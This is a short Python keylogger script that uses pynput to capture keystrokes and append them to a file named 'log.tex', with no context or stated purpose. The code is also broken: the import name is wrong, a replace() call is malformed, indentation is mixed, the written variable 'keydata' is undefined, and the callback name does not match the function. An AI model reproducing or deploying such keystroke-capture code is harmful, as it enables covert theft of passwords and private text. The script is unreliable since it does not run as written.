from pynput.keyboard import listener 

def write_to_file(key):
	letter = str(key)
	letter = letter.replace("','")

	if letter == 'key.space':
		letter = ''
	if letter == 'key.shift_r':
		letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

	with open("log.tex", "a") as f:
   	    f.write(keydata)


with listener(on_press=writetofile) as l:
	l.join()

